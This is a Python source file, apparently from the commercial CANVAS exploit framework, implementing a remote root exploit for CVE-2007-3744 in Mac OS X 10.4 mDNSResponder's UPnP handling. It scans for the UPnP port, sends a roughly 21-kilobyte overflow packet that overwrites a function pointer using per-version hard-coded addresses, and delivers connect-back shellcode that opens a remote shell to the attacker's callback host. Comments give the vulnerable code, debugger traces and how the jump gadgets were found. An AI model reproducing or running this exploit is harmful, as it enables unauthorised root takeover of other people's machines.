#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
MU: MacOS X 10.4 mDNSResponder UPNP Remote Root Exploit
"""

import sys, time
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
from encoder import chunkedaddencoder
import threading, socket, select
import random

# GUI info
NAME="MacOS X 10.4 mDNSResponder UPNP Remote Root Exploit"
DESCRIPTION="MacOS X 10.4 mDNSResponder UPNP Remote Root Exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Apple"
DOCUMENTATION["CVE Name"] = "CVE-2007-3744"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3744"
DOCUMENTATION['CVSS'] = 5.8
DOCUMENTATION["Notes"] = """If the target port is not specified, it will be located automatically.
This exploit will attempt to bypass the built-in OS X firewall by sending packets
from port 5353. Hence, it currently only works from a LocalNode.

If you're testing on your own box, and you crash mDNS, by picking the wrong
version, you can find the new port via: netstat -an | grep udp4

It will likely be 49XXX or 5XXXX.

This exploit does not work FROM an OS X machine due to UDP packet size limits. Sorry!
"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Mac OS X", "ppc", "Intel" ] ]
PROPERTY['VERSION'] = ["10.4"]
PROPERTY['0DAY'] = False


CHANGELOG="""

"""

NOTES="""
For Command Line, you need to use the LINUXEXECVE option
 ./commandlineInterface.py -v 0 -p 5555

# MacOS X includes a network technology called Bonjour (previously
# 'Rendezvous') also known as Zero Conf networking that uses standard
# DNS queries over multicast IP.  The daemon that handles this is
# 'mDNSResponder'.  In MacOS X 10.4, this daemon also gained support
# for Universal Plug-and-Play, Microsoft's similar technology that is
# basically SOAP over multicast UDP.  There is a data segment buffer
# overflow in parsing the hostname in the URL specified in the
# Location header in received UPNP messages replies (however
# unsolicited replies are received and parsed).
#
# THE BUG:
# if (strcasecmp(pHeader->pszName, "Location") == 0) {
#    p = pHeader->pszValue;
#    q = strchr(p, ':');
#    if (q == NULL) {
#        sprintf(g_szRouterHostPortDesc, "%s", p);


# First, we have to find the UDP port used to send and receive UPNP
# messages.  We can sniff the network for UPNP messages to UDP port
# 1900 (not for the impatient), nmap the host (slow), or scan for it
# ourselves by sending UPNP messages that would solicit a response.
# In this case, we specify a device configuration URL pointing to a
# listening TCP socket, and when we get a connection, we know that we
# have found the UPNP UDP port.
#
# We exploit this bug by writing roughly 22 kilobytes so that
# overwrite a function pointer in a global structure.  We just have to
# carefully chose some values to get us to where the pointer is used
# (see below).
#
"""

# Magic numbers
#

# We need a pointer to zero in writable memory with *(p+0xa8) (4
# byte value) having a non-zero value.  dyld (runtime linker) is
# loaded at a constant value in all proceses, so we grab something out
# of its data segment
#PTR_TO_ZERO = 0x8fe51f4c # 10.4.{0,1}
#PTR_TO_ZERO=0x8fe53768
# This is the exact place where the PTR_TO_ZERO is used
# Note: If we put a non writeble area, we will crash on a stw ...
#    Breakpoint 1, 0x0000b020 in mDNSDaemonIdle ()
#    2: x/i $pc  0xb020 <mDNSDaemonIdle+32>: lwz     r0,168(r2)
#


# When the overwritten function pointer is used, r26, r27, r30, r31
# point to g_szUSN+556, so we put our shellcode there and use a
# register indirect jump.  dyld rarely changes, so finding one in
# there is usually a good idea.
#RET = 0x8fe2d398       # 10.4.{0,1} mtspr ctr,r26; bctrl
#RET = 0x8fe427a4   # 10.4.2
#
# We want to look for the whole combination of addy, so we need to search for
# mtspr for r26,27,30,31
# (0x7f4903a6      0x7f6903a6      0x7fc903a6      0x7fe903a6) opcodes
# right next to a bctrl (0x4e800421)
# lame way to do it:
#    otool -t /usr/lib/dyld | grep 7f6903a6 | grep 4e800421

# So ptr to ZERO is not just a Pointer to Zero, also it needs
# to had in %eax+0xa8, a value (smaller as possible). Cause later
# that would be compare with whats return from TimeNow()
# and if its signed, it -won't- jump into the function pointer
# Before the function pointer is triggered,
#00003374        calll   _mDNS_TimeNow
#00003379        movl    %eax,%edi
#0000337b        movl    (%ebx),%eax
#0000337d        movl    0x000000a8(%eax),%eax # this is ptr_to_zero
#00003383        testl   %eax,%eax
#00003385        je      0x00003393
#00003387        cmpl    %eax,%edi
#00003389        js      0x00003393
#0000338b        movl    %ebx,(%esp,1)
#0000338e        calll   _mDNSMacOSXNetworkChanged


# The function pointer gets triggered here:
#000140b1        movl    0x18(%edi),%eax  # 0x18 of the mdns structure
#000140b4        testl   %eax,%eax
#000140b6        je      0x000140c5
#000140b8        movl    $0xfffeff01,0x04(%esp,1)
#000140c0        movl    %edi,(%esp,1)
#000140c3        calll   %eax
# This is: 0x140c3 <mDNSMacOSXNetworkChanged+152>: call   *%eax


# Sometimes the exploit have a different behaviour, thats why we brute force it
# so, if you are debugging it and receive this (dont panic):
#   Program received signal EXC_BAD_ACCESS, Could not access memory.
#   Reason: KERN_INVALID_ADDRESS at address: 0x4141414d
#   0x0000b074 in mDNSDaemonIdle ()
#   2: x/i $pc  0xb074 <mDNSDaemonIdle+116>:        lwz     r0,12(r23)
#
#

intel_targets = (0, 7, 8)
_targets = {
    0 : ["Mac OSX Brute Force (Intel only)", 0, 0x0],    # this would be enough
    1 : ["Mac OSX 10.4.0/10.4.1", 0x8fe51f4cL, 0x8fe2d398L,0],
    2 : ["Mac OSX 10.4.2", 0x8fe53768L, 0x8fe427a4L, 0],
    3 : ["Mac OSX 10.4.3/10.4.4", 0x8fe56d68L, 0x8fe41aecL, 0],
    6 : ["Mac OSX 10.4.6", 0x8fe5a258L, 0x8fe264a8L, 8],
    7 : ["Mac OSX 10.4.7 (intel)", 0x8fe4e390, 0x8fe028d7L, 0x100 - 0x9c], # ret = call edi
    8 : ["Mac OSX 10.4.9 (intel)", 0x8fe4d2fc, 0x8fe02715L, 0x100 - 0x9c] # ret = call edi
    }


class UPNP_HTTPServer(threading.Thread, tcpexploit):
    def __init__(self, localhost, port = 0, timeout=20):
        threading.Thread.__init__(self)
        tcpexploit.__init__(self)
        self.localhost = localhost
        self.port = port
        self.timeout = timeout
        self.error = 0
        self.lock = 1
        self.accepted=0
        self.name="UPNP_HTTPServer on port %d"%self.port
        return

    def bind(self):

        self.s=self.gettcpsock()
        try:
            self.log("UPNP_HTTPServer binding to %s:%d"%(self.localhost, self.port))
            self.s.bind( (self.localhost, self.port) )
        except socket.error, msg:
            self.error = 1
            self.buf = "You need to run this exploit as root: %s" % str(msg)
            self.lock = 0
            return None

    def getport(self):
        return self.s.getsockname()[1]

    # stole that function from a sinan's exploit
    def recvstuff(self, sock):
        """
        We need to rip this function out and replace it with something
        bouncable that doesn't use select!
        """
        count = 5
        buf = ""

        while count:
                rd, wr, ex = select.select([sock], [], [], 5)

                if not rd:
                    if count:
                        count -= 1
                        continue
                    else:
                        if len(buf):
                            return buf
                        else:
                            return ""
                try:
                    tmp = sock.recv(2<<16)
                except socket.error:
                    #broken connection
                    return ""
                if tmp:
                    buf += tmp

                return buf

    def run(self):
        import timeoutsocket
        timeoutsocket.setDefaultSocketTimeout(self.timeout)

        self.s.listen(1)
        self.s.set_timeout(self.timeout)
        try:
            (c, addr) = self.s.accept()
            self.accepted=1
            self.buf = self.recvstuff(c)
        except timeoutsocket.Timeout, msg:
            self.error = 1
            self.buf="Timeout has been reached: %s" % str(msg)
            self.lock = 0
        self.lock =0
        return

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 0
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = "\x00\x2f"
        self.myDCE = None
        self.version = 0
        self.name=NAME
        self.startport=49000
        self.timeout = 30
        return

    def neededListenerTypes(self):
        import canvasengine
        #from canvasengine import OSXMOSDEF
        if self.version in intel_targets:
            return [canvasengine.UNIXSHELL ]
        else:
            return [ canvasengine.OSXMOSDEF_PPC ]

    def createShellcode(self):

        host=self.callback.ip
        port=self.callback.port

        from shellcode import shellcodeGenerator
        if self.version in intel_targets:
            self.log("OSX X86 Shellcode %d" % self.version)
            sc = shellcodeGenerator.osx_X86()
            sc.addAttr("connectback_execve",{"ipaddress": host, "port": port})
            self.shellcode = sc.get()
            #encoder = chunkedaddencoder.intelchunkedaddencoder()
            #encoder.setbadstring(self.badstring)
            #self.shellcode = encoder.encode(self.shellcode)
        else:
            self.log("OSX PPC Shellcode")
            sc = shellcodeGenerator.osxPPC()
            sc.addAttr("connect",{"ipaddress": self.callback.ip, "port": self.callback.port})
            sc.addAttr("RecvExec",None)

            self.shellcode = sc.get()

            from encoder import addencoder
            encoder = addencoder.ppcaddencoder()
            encoder.setbadstring(self.badstring)
            self.shellcode = encoder.encode(self.shellcode)

        self.log("Shellcode size: %d" % len(self.shellcode))
        self.log( prettyhexprint(self.shellcode) )


    def getPNPPort(self):
        self.log("Getting PNP port remotely with scanner")
        localhost = self.callback.ip
        self.log("Scanner using interface: %s"%localhost)
        u=UPNP_HTTPServer(localhost, timeout=self.timeout)
        u.link(self)
        u.bind()
        myport = u.getport()

        u.start() #start our thread here which will be responsible for answering queries

        # we need time for the listening http thread to enter
        time.sleep(1)
        port = self.startport
        topport= 65535
        #port=1


        while u.lock and port <= topport:

            if u.accepted:
                self.log("We've accepted a connection - breaking out of loop")
                break
            if self.state==self.HALT:
                self.log("Halted while looking for port")
                return 0
            if port % 1000 == 0:
                self.log("Testing port %d"%port)

            msg = "HTTP/1.1 200 Ok\r\n" +\
            "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n"+\
            "USN: foo\r\n" +\
            "Location: http://" + localhost + ":" + str(myport) + "/" +\
            str(port) + "\r\n\r\n"
            self.sox.sendto(msg, (self.host, int(port)))
            port += 1
            time.sleep(0.001)

        time.sleep(self.timeout+15)


        if port >= topport:
            self.log("No port found!")
            return 0
        u.join()
        if u.error:
            self.log("Error finding port: %s" % u.buf)
            return 0
        get= u.buf.find("GET")
        if get == -1:
            self.log("Error finding port (%s)" % u.buf)
            return 0
        end= u.buf[get+5:].find(" ")
        if end == -1:
            self.log("Error finding port (%s)" % u.buf)
            return 0
        self.log(str(get))
        return dInt(u.buf[get+5: get+5+end])


    def test(self):
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface

        s=self.gettcpsock()

        try:
            s.connect( (self.host, self.port))
        except socket.error:
            return 0
        except TypeError:
            self.log("Typeerror in MU - ?")
            return 0

        s.close()

        return 1


    # Sends PNP shellcode
    def sendPNPshellcode(self):
        msg = "HTTP/1.1 200 Ok\r\n" +\
            "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n"+\
            "USN: " + "A" * (556+300-len(self.shellcode)) +self.shellcode + "\r\n\r\n"

        self.sox.sendto(msg, (self.host, self.pnpport))
        return


    # Send exploit code
    def sendPNPExploit(self):

        import struct
        endianness = ">"
        if self.version in intel_targets:
            endianness = ""

        # Note:
        #  In intel osx, we have the shellcode just before the mdns structure.
        #  we use as an addy, a call edi, which end up executing our
        #  mdns structure (the ptr_to_zero would be understand it as opcode:
        #(gdb) x/4x $edi
        #0x41020 <mDNSStorage>:  0x8fe4d2fc      0x05c783c0      0x41c307c6      0xffff6ce9
        #(gdb) si
        #0x00041020 in mDNSStorage ()
        #1: x/i $pc  0x41020 <mDNSStorage>:      cld
        #(gdb)
        #0x00041021 in mDNSStorage ()
        #1: x/i $pc  0x41021 <mDNSStorage+1>:    shl    %cl,%ah
        #(gdb)
        #0x00041023 in mDNSStorage ()
        #1: x/i $pc  0x41023 <mDNSStorage+3>:    pop    %eax
        # After that, we craft a jmp -94 in the msdn structure to jmp back to shellcode

        mdns = struct.pack(endianness + "LLLLLHHL", self.ptr_to_zero,   # mDNS_PlatformSupport* p
                           0xff6ce9c0L,    # mDNSu32 KnownBugs
                           0xdeadffffL,    # mDNSBool CanReceiveUnicastOn5353
                           0xdeadbeefL,    # mDNSBool AdvertiseLocalAddresses
                           0xdeadbeefL,    # mStatus mDNSPlatformStatus
                           0xdead,        # mDNSIPPort UnicastPort4
                           0xdead,        # mDNSIPPort UnicastPort6
                           self.ret)    # mDNSCallback* MainCallback
        msg = "HTTP/1.1 200 Ok\r\n" +\
        "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n"+\
        "Location: http://"


        if self.version in intel_targets:
            exp =  "A"  * (21020 + self.offset - len(self.shellcode) ) + self.shellcode + mdns
        else:
            exp = "A"  * (21020 + self.offset) + mdns

        tail = "\r\n\r\n"

        self.sox.sendto(msg+exp+tail , (self.host, self.pnpport))

        return

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port", self.port))
        self.startport=self.argsDict.get("startport",self.startport)
        self.version = int(self.argsDict.get("version",self.version))
        return


    def setUDPsock(self):
        self.sox=self.getudpsock()
        try:
            self.sox.bind(('',5353))
        except:
            self.log("Cannot bind port: 5353, trying random")
            try:
                self.sox.bind(('',0))
            except:
                self.log("Bind failed")
                return False

        return True

    def run(self):
        """
        Runs the exploit, but if we are of version zero, then
        runs the exploit with all of the intel targets
        """
        self.getargs()

        if(not self.setUDPsock()):
            return

        if self.version==0:
            for version in intel_targets:
                if version!=0:
                    self.version=version
                    self.log("Attacking version: %s"%_targets[self.version][0])
                    self.do_run()
                    if self.ISucceeded():
                        self.sox.close()
                        return 1

        else:
            self.do_run()
            if self.ISucceeded():
                self.sox.close()
                return 1

        self.sox.close()

        return


    def do_run(self):
        self.ptr_to_zero = _targets[self.version][1]
        self.ret = _targets[self.version][2]
        self.offset = _targets[self.version][3]
        target = _targets[self.version][0]

        TRIES = 3

        self.setInfo("%s attacking %s:%d [%s] - (in progress)"% (NAME, self.host, self.port, target))
        self.log("%s attacking %s:%d [%s] - (in progress)"% (NAME, self.host, self.port, target))

        for a in range(0, TRIES):

            self.log("Trying attack: %d"%(a+1))

            if self.port == 0:
                self.pnpport = self.getPNPPort()
            else:
                self.pnpport = self.port

            if not self.pnpport :
                self.setInfo("%s attacking %s:%d - (failed!)" % (NAME, self.host, self.port), showlog=1)
                return 0

            self.log("UPNP Port found: %d" % self.pnpport)
            if self.version not in intel_targets:
                self.log("Sending shellcode #%d" % (a+1))
                self.sendPNPshellcode()

            self.log("Sending Exploit Packet #%d" % (a+1))
            self.sendPNPExploit()
            self.log("Sleeping to see if we succeeded, or give it time to recover")
            time.sleep(5)

            if self.ISucceeded():
                self.setInfo("%s attacking %s:%d [%s] - (succeeded!)" % (NAME, self.host, self.port, target))
                self.log("%s attacking %s:%d [%s] - (succeeded!)" % (NAME, self.host, self.port, target))
                return 1

            self.log("Failed, retrying in 5sec")
            time.sleep(5)

        self.setInfo("%s attacking %s:%d - (failed!)" % (NAME, self.host, self.port), showlog=1)
        return 0


    def usage(self):
        print "Usage: %s -v version -t host -l localIP -d localPort (connectback) [-p: port]" % sys.argv[0]
        print "       if <port> is not specified, it will be located automatically\n"
        print "Available versions:"
        target_indexes = _targets.keys()
        target_indexes.sort()
        for index in target_indexes:
            print "\t%s : %s" % (index, _targets[index][0])


if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)

